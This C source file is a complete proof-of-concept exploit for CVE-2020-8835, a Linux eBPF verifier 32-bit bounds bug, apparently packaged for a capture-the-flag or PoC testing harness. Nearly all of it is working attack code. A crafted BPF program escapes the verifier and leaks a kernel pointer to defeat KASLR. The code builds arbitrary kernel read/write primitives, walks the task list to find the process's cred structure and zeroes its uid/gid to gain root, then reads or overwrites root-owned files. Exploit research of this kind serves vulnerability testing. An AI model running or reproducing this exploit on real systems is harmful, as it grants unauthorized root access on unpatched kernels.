/**
 * CVE-2020-8835 PoC - eBPF Verifier 32-bit Bounds Tracking Error
 *
 * Vulnerability: BPF verifier in kernel/bpf/verifier.c does not properly
 * restrict register bounds for 32-bit operations, leading to OOB read/write
 * in kernel memory via BPF map access.
 *
 * Affected versions: 5.4.7 ~ 5.6.1, 5.5.0 ~ 5.5.14
 * Fixed in: 5.6.1, 5.5.14, 5.4.29
 *
 * Exploitation method:
 * 1. bpf(BPF_PROG_LOAD) - Load crafted BPF program exploiting 32-bit ALU bug
 * 2. 32-bit ALU operation sequence bypasses verifier bounds check
 * 3. OOB access on BPF map -> kernel arbitrary read/write
 * 4. Traverse task list, locate current task's cred structure
 * 5. Overwrite cred uid/gid/caps to 0 -> privilege escalation
 * 6. Perform CTF file operation with elevated privileges
 *
 * Reference: https://github.com/zilong3033/CVE-2020-8835
 *
 * Safety: alarm(10) forced timeout via poc_common.h
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <linux/bpf.h>

#include "../common/poc_common.h"

/* ========================================================================
 * Constants
 * ======================================================================== */
#define CVE_ID "CVE-2020-8835"
#define MAX_FILE_SIZE 4096

#ifndef __NR_BPF
#define __NR_BPF 321
#endif

#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))

/* ========================================================================
 * BPF instruction macros (from original exploit)
 * ======================================================================== */
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){                         \
        .code = CODE,                           \
        .dst_reg = DST,                         \
        .src_reg = SRC,                         \
        .off = OFF,                             \
        .imm = IMM})

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)        \
    ((struct bpf_insn){                         \
        .code = BPF_LD | BPF_DW | BPF_IMM,     \
        .dst_reg = DST,                         \
        .src_reg = SRC,                         \
        .off = 0,                               \
        .imm = (__u32)(IMM)}),                  \
    ((struct bpf_insn){                         \
        .code = 0,                              \
        .dst_reg = 0,                           \
        .src_reg = 0,                           \
        .off = 0,                               \
        .imm = ((__u64)(IMM)) >> 32})

#define BPF_MOV64_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)
#define BPF_MOV64_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)
#define BPF_ALU64_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)
#define BPF_ALU64_REG(OP, DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)
#define BPF_JMP_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)
#define BPF_JMP_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)
#define BPF_JMP32_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)
#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)
#define BPF_LD_MAP_FD(DST, MAP_FD) BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)
#define BPF_ST_MEM(SIZE, DST, OFF, IMM) BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)
#define BPF_STX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

/* BPF_MAP_GET: lookup map[idx] and load 8-byte value into dst register */
#define BPF_MAP_GET(idx, dst)                                                \
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                    \
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                   \
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                                  \
    BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                                 \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),   \
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                                 \
    BPF_EXIT_INSN(),                                                         \
    BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0),                                \
    BPF_MOV64_IMM(BPF_REG_0, 0)

/* BPF_MAP_GET_ADDR: lookup map[idx] and get pointer into dst register */
#define BPF_MAP_GET_ADDR(idx, dst)                                           \
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                    \
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                   \
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                                  \
    BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                                 \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),   \
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                                 \
    BPF_EXIT_INSN(),                                                         \
    BPF_MOV64_REG((dst), BPF_REG_0),                                         \
    BPF_MOV64_IMM(BPF_REG_0, 0)

/* ========================================================================
 * Global state
 * ======================================================================== */
#define LOG_BUF_SIZE 65536
static char bpf_log_buf[LOG_BUF_SIZE];
static char socket_buf[64];
static int sockets[2];
static int mapfd = -1;

/* ========================================================================
 * BPF helper functions
 * ======================================================================== */
static int bpf_create_map(enum bpf_map_type map_type, unsigned int key_size,
                          unsigned int value_size, unsigned int max_entries) {
    union bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries
    };
    int ret = (int)syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr));
    poc_log_syscall("bpf(BPF_MAP_CREATE)", ret, errno);
    return ret;
}

static int bpf_obj_get_info_by_fd(int fd, unsigned int info_len, void *info) {
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.info.bpf_fd = fd;
    attr.info.info_len = info_len;
    attr.info.info = ptr_to_u64(info);
    return (int)syscall(__NR_BPF, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
}

static int bpf_lookup_elem(int fd, const void *key, void *value) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = ptr_to_u64(key),
        .value = ptr_to_u64(value),
    };
    return (int)syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

static int bpf_update_elem(int fd, const void *key, const void *value, uint64_t flags) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = ptr_to_u64(key),
        .value = ptr_to_u64(value),
        .flags = flags,
    };
    return (int)syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_prog_load(enum bpf_prog_type type, const struct bpf_insn *insns,
                         int insn_cnt, const char *license) {
    union bpf_attr attr = {
        .prog_type = type,
        .insns = ptr_to_u64(insns),
        .insn_cnt = insn_cnt,
        .license = ptr_to_u64(license),
        .log_buf = ptr_to_u64(bpf_log_buf),
        .log_size = LOG_BUF_SIZE,
        .log_level = 1,
    };
    int ret = (int)syscall(__NR_BPF, BPF_PROG_LOAD, &attr, sizeof(attr));
    poc_log_syscall("bpf(BPF_PROG_LOAD)", ret, errno);
    return ret;
}

/* ========================================================================
 * Exploit primitives
 * ======================================================================== */
static void update_elem(int key, size_t val) {
    if (bpf_update_elem(mapfd, &key, &val, 0)) {
        poc_log("bpf_update_elem(key=%d) failed: %s", key, strerror(errno));
    }
}

static size_t get_elem(int key) {
    size_t val = 0;
    if (bpf_lookup_elem(mapfd, &key, &val)) {
        poc_log("bpf_lookup_elem(key=%d) failed: %s", key, strerror(errno));
    }
    return val;
}

static int write_msg(void) {
    ssize_t n = write(sockets[0], socket_buf, sizeof(socket_buf));
    if (n < 0) {
        poc_log_syscall("write(socket)", n, errno);
        return -1;
    }
    return 0;
}

/**
 * Load the exploit BPF program that abuses 32-bit ALU bounds tracking error.
 * The program supports 4 operations via map[1]:
 *   op=0: Read kernel address (leak map ops for KASLR bypass)
 *   op=1: Write to btf pointer (arbitrary write setup)
 *   op=2: Read via attr (arbitrary kernel read)
 *   op=3: Write ops and change map type (full arbitrary write)
 */
static int load_exploit_prog(void) {
    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_9, mapfd),
        BPF_MAP_GET(0, BPF_REG_6),
        BPF_JMP_IMM(BPF_JGE, BPF_REG_6, 1, 1),
        BPF_EXIT_INSN(),
        BPF_LD_IMM64(BPF_REG_7, 0x100000001),
        BPF_JMP_REG(BPF_JLE, BPF_REG_6, BPF_REG_7, 1),
        BPF_EXIT_INSN(),
        /* 32-bit compare: verifier thinks reg6 can only be 5, but at runtime
         * the 32-bit bounds are wrong, allowing broader range */
        BPF_JMP32_IMM(BPF_JNE, BPF_REG_6, 5, 1),
        BPF_EXIT_INSN(),
        /* After this AND+RSH, verifier believes reg6=0, but runtime reg6=1 */
        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 2),
        BPF_ALU64_IMM(BPF_RSH, BPF_REG_6, 1),
        BPF_MAP_GET(1, BPF_REG_7),  /* op code */

        /* op=0: leak map ops address (KASLR bypass) */
        BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 0, 23),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x110),
        BPF_MAP_GET_ADDR(0, BPF_REG_7),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),
        BPF_MAP_GET_ADDR(4, BPF_REG_6),
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),
        BPF_EXIT_INSN(),

        /* op=1: write to btf pointer */
        BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 1, 22),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0xd0),
        BPF_MAP_GET_ADDR(0, BPF_REG_7),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
        BPF_MAP_GET(2, BPF_REG_8),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),
        BPF_EXIT_INSN(),

        /* op=2: read via bpf_obj_get_info_by_fd */
        BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 2, 23),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x50),
        BPF_MAP_GET_ADDR(0, BPF_REG_7),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),
        BPF_MAP_GET_ADDR(4, BPF_REG_6),
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),
        BPF_EXIT_INSN(),

        /* op=3: write ops and change map type (arbitrary write) */
        BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 3, 60),
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_6),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x110),
        BPF_MAP_GET_ADDR(0, BPF_REG_7),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
        BPF_MAP_GET(2, BPF_REG_6),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_8),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0xf8),
        BPF_MAP_GET_ADDR(0, BPF_REG_7),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),
        BPF_ST_MEM(BPF_W, BPF_REG_7, 0, 0x17),
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_6),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0xec),
        BPF_MAP_GET_ADDR(0, BPF_REG_7),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
        BPF_ST_MEM(BPF_W, BPF_REG_7, 0, -1),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0xe4),
        BPF_MAP_GET_ADDR(0, BPF_REG_7),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),
        BPF_ST_MEM(BPF_W, BPF_REG_7, 0, 0),
        BPF_EXIT_INSN(),
    };
    return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog,
                         sizeof(prog) / sizeof(struct bpf_insn), "GPL");
}

/**
 * Kernel arbitrary read (8 bytes) via OOB BPF map access.
 * Uses op=1 to set btf pointer, then bpf_obj_get_info_by_fd to read.
 */
static size_t kread64(size_t addr) {
    uint32_t lo, hi;
    char buf[0x50] = {0};

    /* Read low 4 bytes */
    update_elem(0, 2);
    update_elem(1, 1);
    update_elem(2, addr - 0x58);
    write_msg();
    if (bpf_obj_get_info_by_fd(mapfd, 0x50, buf)) {
        poc_log("kread64: bpf_obj_get_info_by_fd failed (low): %s", strerror(errno));
        return 0;
    }
    lo = *(unsigned int *)&buf[0x40];

    /* Read high 4 bytes */
    update_elem(2, addr - 0x58 + 4);
    write_msg();
    if (bpf_obj_get_info_by_fd(mapfd, 0x50, buf)) {
        poc_log("kread64: bpf_obj_get_info_by_fd failed (high): %s", strerror(errno));
        return 0;
    }
    hi = *(unsigned int *)&buf[0x40];

    return (((size_t)hi) << 32) | lo;
}

/** Clear btf pointer (restore safe state) */
static void clear_btf(void) {
    update_elem(0, 2);
    update_elem(1, 1);
    update_elem(2, 0);
    write_msg();
}

/** Kernel arbitrary write (4 bytes) via corrupted map ops */
static void kwrite32(size_t addr, uint32_t data) {
    uint64_t key = 0;
    data -= 1;
    if (bpf_update_elem(mapfd, &key, &data, addr)) {
        poc_log("kwrite32 failed at 0x%lx: %s", (unsigned long)addr, strerror(errno));
    }
}

/** Kernel arbitrary write (8 bytes) */
static void kwrite64(size_t addr, size_t data) {
    uint32_t lo = data & 0xffffffff;
    uint32_t hi = (data & 0xffffffff00000000ULL) >> 32;
    kwrite32(addr, lo);
    kwrite32(addr + 4, hi);
}

/* ========================================================================
 * Exploit flow
 * ======================================================================== */

/**
 * Full exploitation chain:
 * 1. Create BPF map + load exploit program
 * 2. Leak kernel base (KASLR bypass) via map ops pointer
 * 3. Setup arbitrary read/write primitives
 * 4. Traverse task list from init_pid_ns to find our task
 * 5. Overwrite cred->uid/gid/caps to 0
 *
 * Returns 0 on success (uid==0), -1 on failure
 */
static int do_exploit(void) {
    poc_log("=== Starting BPF verifier 32-bit bypass exploit ===");

    /* Step 1: Create BPF map */
    mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int),
                           sizeof(long long), 0x100);
    if (mapfd < 0) {
        poc_log("Failed to create BPF map: %s", strerror(errno));
        return -1;
    }
    poc_log("BPF map created: fd=%d", mapfd);

    /* Step 2: Load exploit BPF program */
    poc_log("Loading exploit BPF program (32-bit ALU bypass)...");
    int progfd = load_exploit_prog();
    if (progfd < 0) {
        if (errno == EPERM) {
            poc_log("BPF prog load denied (unprivileged_bpf_disabled=1)");
        } else {
            poc_log("BPF prog load failed: %s", strerror(errno));
        }
        close(mapfd);
        return -1;
    }
    poc_log("Exploit BPF program loaded: fd=%d", progfd);

    /* Step 3: Create socket pair and attach BPF */
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) {
        poc_log_syscall("socketpair(AF_UNIX, SOCK_DGRAM)", -1, errno);
        close(progfd);
        close(mapfd);
        return -1;
    }
    poc_log_syscall("socketpair(AF_UNIX, SOCK_DGRAM)", 0, 0);

    if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0) {
        poc_log_syscall("setsockopt(SO_ATTACH_BPF)", -1, errno);
        close(sockets[0]); close(sockets[1]);
        close(progfd); close(mapfd);
        return -1;
    }
    poc_log_syscall("setsockopt(SO_ATTACH_BPF)", 0, 0);

    /* Step 4: Leak map ops address (KASLR bypass) */
    update_elem(0, 2);
    update_elem(1, 0);
    write_msg();
    size_t ops_addr = get_elem(4);
    if (ops_addr == 0) {
        poc_log("Failed to leak ops address");
        goto cleanup;
    }
    /* Kernel base offset for array_map_ops (kernel-version specific) */
    size_t linux_base = ops_addr - 0x10169c0;
    poc_log("Leaked map ops: 0x%lx, kernel base: 0x%lx",
            (unsigned long)ops_addr, (unsigned long)linux_base);

    /* Step 5: Read map ops table for later use */
    char ops[0xe8];
    memset(ops, 0, sizeof(ops));
    for (int i = 0; i < 0xe8; i += 8) {
        *(size_t *)&ops[i] = kread64(ops_addr + i);
        update_elem(0x10 + i / 8, *(size_t *)&ops[i]);
    }
    update_elem(0x10 + 0x70 / 8, *(size_t *)&ops[0x20]);

    /* Step 6: Get heap/values address */
    update_elem(0, 2);
    update_elem(1, 2);
    write_msg();
    size_t heap_addr = get_elem(4);
    size_t values_addr = heap_addr + 0x50;
    poc_log("Values address: 0x%lx", (unsigned long)values_addr);

    /* Step 7: Find our task_struct via init_pid_ns traversal */
    size_t init_pid_ns = linux_base + 0x1446260;
    pid_t pid = getpid();
    poc_log("Current PID: %d, init_pid_ns: 0x%lx",
            pid, (unsigned long)init_pid_ns);

    size_t task_addr = kread64(init_pid_ns + 0x38);
    size_t cred_addr = 0;
    int found = 0;

    for (int iter = 0; iter < 1000; iter++) {
        pid_t p = (pid_t)kread64(task_addr + 0x490);
        if (p == pid) {
            cred_addr = kread64(task_addr + 0x638);
            found = 1;
            poc_log("Found task_struct at 0x%lx, cred at 0x%lx",
                    (unsigned long)task_addr, (unsigned long)cred_addr);
            break;
        }
        task_addr = kread64(task_addr + 0x390) - 0x390;
        if (task_addr == 0 || task_addr == (size_t)-0x390) {
            break;
        }
    }

    if (!found || cred_addr == 0) {
        poc_log("Failed to locate task_struct/cred");
        goto cleanup;
    }

    /* Step 8: Overwrite cred uid/gid to 0 (privilege escalation) */
    poc_log("Overwriting cred uid/gid/caps to 0...");
    clear_btf();
    update_elem(0, 2);
    update_elem(1, 3);
    update_elem(2, values_addr + 0x80);
    write_msg();

    kwrite32(cred_addr + 4, 0);    /* uid */
    kwrite64(cred_addr + 8, 0);    /* gid + suid */
    kwrite64(cred_addr + 16, 0);   /* sgid + euid */

    /* Verify privilege escalation */
    if (getuid() == 0) {
        poc_log("Privilege escalation SUCCESSFUL! uid=%d euid=%d",
                getuid(), geteuid());
        close(progfd);
        return 0;
    }

    poc_log("Privilege escalation failed: uid=%d", getuid());

cleanup:
    close(sockets[0]);
    close(sockets[1]);
    close(progfd);
    close(mapfd);
    return -1;
}

/* ========================================================================
 * CTF mode handlers
 * ======================================================================== */

/**
 * CTF write_root_file mode:
 * After exploiting, use elevated privileges to write CTF value to root file.
 */
static int mode_write_root_file(const poc_args_t *args) {
    char read_buf[MAX_FILE_SIZE] = {0};
    int fd;
    ssize_t n;

    /* Step 1: Read original file content */
    fd = open(args->root_file, O_RDONLY);
    if (fd < 0) {
        poc_print_fail("Cannot open root file for read");
        return 1;
    }
    n = read(fd, read_buf, sizeof(read_buf) - 1);
    close(fd);
    if (n < 0) {
        poc_print_fail("Cannot read root file");
        return 1;
    }
    read_buf[n] = '\0';
    /* Trim trailing newline */
    while (n > 0 && read_buf[n - 1] == '\n') read_buf[--n] = '\0';
    printf("CTF_READ_BEFORE:%s\n", read_buf);
    poc_log("CTF_READ_BEFORE:%s", read_buf);

    /* Step 2: Trigger exploitation */
    printf("CTF_WRITE:%s (attempting...)\n", args->write_value);
    poc_log("CTF_WRITE:%s (attempting...)", args->write_value);

    int ret = do_exploit();
    if (ret != 0) {
        poc_print_fail("Exploitation failed - BPF verifier bypass not achievable");
        return 1;
    }

    /* Step 3: Write CTF value to root file (now with uid=0) */
    char write_value[512];
    snprintf(write_value, sizeof(write_value), "%s\n", args->write_value);

    fd = open(args->root_file, O_WRONLY | O_TRUNC);
    if (fd < 0) {
        poc_print_fail("Cannot open root file for write after exploit");
        return 1;
    }
    n = write(fd, write_value, strlen(write_value));
    poc_log_syscall("write(root_file)", n, errno);
    close(fd);
    if (n < 0) {
        poc_print_fail("Write to root file failed");
        return 1;
    }

    /* Step 4: Read-after verification */
    fd = open(args->root_file, O_RDONLY);
    if (fd < 0) {
        poc_print_fail("Cannot reopen root file for verification");
        return 1;
    }
    memset(read_buf, 0, sizeof(read_buf));
    n = read(fd, read_buf, sizeof(read_buf) - 1);
    close(fd);
    if (n > 0) {
        read_buf[n] = '\0';
        while (n > 0 && read_buf[n - 1] == '\n') read_buf[--n] = '\0';
    }
    printf("CTF_READ_AFTER:%s\n", read_buf);
    poc_log("CTF_READ_AFTER:%s", read_buf);

    /* Step 5: Verify and output result */
    if (strstr(read_buf, args->write_value) != NULL) {
        poc_print_flag(args->write_value);
        return 0;
    } else {
        poc_print_fail("Write verification failed");
        return 1;
    }
}

/**
 * CTF read_root_file mode:
 * After exploiting, use elevated privileges to read root-only file.
 */
static int mode_read_root_file(const poc_args_t *args) {
    /* Trigger exploitation first */
    poc_log("Triggering exploit for read_root_file mode...");
    int ret = do_exploit();
    if (ret != 0) {
        poc_print_fail("Exploitation failed - BPF verifier bypass not achievable");
        return 1;
    }

    /* Now read the root-owned file with elevated privileges */
    char read_buf[MAX_FILE_SIZE] = {0};
    int fd = open(args->root_file, O_RDONLY);
    if (fd < 0) {
        poc_print_fail("Cannot open root file after exploit");
        return 1;
    }
    poc_log_syscall("open(root_file, O_RDONLY)", fd, errno);

    ssize_t n = read(fd, read_buf, sizeof(read_buf) - 1);
    close(fd);
    if (n <= 0) {
        poc_print_fail("Cannot read root file content");
        return 1;
    }
    read_buf[n] = '\0';
    /* Trim trailing newline */
    while (n > 0 && read_buf[n - 1] == '\n') read_buf[--n] = '\0';

    poc_print_flag(read_buf);
    return 0;
}

/* ========================================================================
 * Legacy mode (no CLI arguments)
 * ======================================================================== */
static int run_legacy_mode(void) {
    printf("=== %s PoC Verification (Legacy Mode) ===\n", CVE_ID);
    printf("Target: eBPF verifier 32-bit bounds tracking error\n");
    printf("Affected: Linux 5.4.7 ~ 5.6.1, 5.5.0 ~ 5.5.14\n\n");

    poc_print_system_info();

    /* Check BPF availability */
    printf("\n--- Phase 1: BPF Subsystem Check ---\n");
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = 8;
    attr.max_entries = 1;

    int test_fd = (int)syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr));
    if (test_fd < 0) {
        if (errno == EPERM) {
            printf("%s BPF not permitted (unprivileged_bpf_disabled=1)\n", POC_STEP_FAIL);
        } else {
            printf("%s BPF MAP_CREATE failed: %s\n", POC_STEP_FAIL, strerror(errno));
        }
        return 1;
    }
    printf("%s BPF subsystem available (test map fd=%d)\n", POC_STEP_PASS, test_fd);
    close(test_fd);

    /* Attempt exploitation */
    printf("\n--- Phase 2: Exploit Attempt ---\n");
    int ret = do_exploit();

    printf("\n%s\n", POC_EVIDENCE_END);

    if (ret == 0) {
        printf("\n%s Privilege escalation successful! uid=%d euid=%d\n",
               POC_STEP_PASS, getuid(), geteuid());
        return 0;
    } else {
        printf("\n%s Exploit did not achieve privilege escalation\n", POC_STEP_WARN);
        return 1;
    }
}

/* ========================================================================
 * Main entry point
 * ======================================================================== */
int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));

    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;
    }

    /* Initialize logging */
    poc_log_init(args.log_file);
    poc_log("=== %s CTF PoC ===", CVE_ID);

    int result;

    /* CTF mode dispatch */
    /* CTF mode is required */
    if (!args.mode) {
        fprintf(stderr, "Error: --mode is required (read_root_file|write_root_file|uaf)\n");
        poc_print_usage(argv[0]);
        poc_log_close();
        return 1;
    }

    if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        poc_log("Mode: write_root_file");
        poc_log("Target: %s", args.root_file);
        poc_log("Value: %s", args.write_value);
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        poc_log("Mode: read_root_file");
        poc_log("Target: %s", args.root_file);
        result = mode_read_root_file(&args);
    } else {
        poc_print_unsupported(args.mode,
            "CVE-2020-8835 supports read_root_file and write_root_file");
        result = 1;
    }

    poc_log_close();
    return result;
}
